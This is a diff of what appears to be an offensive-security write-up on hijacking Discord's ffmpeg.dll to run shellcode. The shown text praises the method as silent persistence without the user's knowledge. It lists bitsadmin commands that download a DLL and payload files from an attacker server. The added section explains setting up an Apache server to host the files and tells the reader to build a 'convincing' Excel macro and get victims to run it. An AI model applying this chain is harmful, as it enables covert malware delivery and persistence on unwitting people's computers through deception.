@@ -52,6 +52,7 @@ Once you've compiled it, copy your DLL, the tmpXYZ.dll (rename it to ffmpeg.dll)
 ![popped](https://user-images.githubusercontent.com/46195001/232325180-3ec3af99-d5f9-4c8c-935c-fd7d3c0ece51.png)
 
 Running Discord.exe executes a shellode. Great! Interestingly Discord itself crashes out with no visual artifacts but our cmd.exe process remains. This is ideal if we drop discord ourselves as a persistence mechanism without user knowledge. 
+</br>
 
 ## Weaponizing 
 It's quite simple to weaponize this DLL hijacking in an automated fashion. Below is a basic macro that downloads a batch file to execute installing discord and download the malicious files. 
@@ -62,8 +63,7 @@ The kicker for this method:
 - Using ffmpeg.dll will give us code execution and crash the legitimate discord process with zero notification to the user. Likely to see WerFault & MiniDumps however. 
 
 
-</br> 
-
+</br>
 
 ### Excel Macro 
 
@@ -127,6 +127,12 @@ bitsadmin /transfer myDownloadJob1 /priority normal %DOWNLOAD_DLL% %DL_DLL%
 bitsadmin /transfer myDownloadJob2 /priority normal %DOWNLOAD_BIN% %DL_bin%
 bitsadmin /transfer myDownloadJob3 /priority normal %DOWNLOAD_tmp% %DL_tmp%
 ```
+
+### Server setup 
+Enable apache 2 and copy across the files from below. 
+![image](https://user-images.githubusercontent.com/46195001/232535184-26456e4b-9a92-439e-b8e1-5c1405b792d1.png)
+
+Create your macro in a convincing manner, get them to execute it. 
 
 ### Result... 
 Popped a shell .. :) 
